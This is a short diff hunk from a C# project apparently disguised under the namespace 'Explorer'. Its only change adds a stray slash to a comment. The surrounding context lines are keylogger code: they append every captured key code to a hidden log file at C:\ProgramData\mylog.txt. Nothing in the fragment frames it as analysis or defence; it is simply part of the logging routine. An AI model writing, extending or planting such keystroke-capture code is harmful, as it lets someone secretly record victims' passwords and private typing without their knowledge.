@@ -74,7 +74,7 @@ namespace Explorer
                     }
                     else
                     {
-                        //Console.Out.Write((Keys)vkCode);
+                        //Console.Out.Write((Keys)vkCode);/
                         StreamWriter output = new StreamWriter(@"C:\ProgramData\mylog.txt", true);
                         output.Write((Keys)vkCode + "_");
                         output.Close();
